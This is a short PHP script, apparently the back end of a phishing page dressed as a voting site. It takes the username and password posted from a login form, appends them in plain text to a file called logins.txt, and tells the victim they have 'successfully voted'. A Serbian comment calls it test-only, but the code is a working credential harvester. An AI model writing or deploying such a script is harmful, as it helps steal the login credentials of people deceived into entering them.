<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Snimanje u fajl (samo za testiranje, nemoj koristiti u pravoj aplikaciji!)
    file_put_contents("logins.txt", "Username: $username, Password: $password\n", FILE_APPEND);
    
    echo "You have successfully voted!";
}
?>
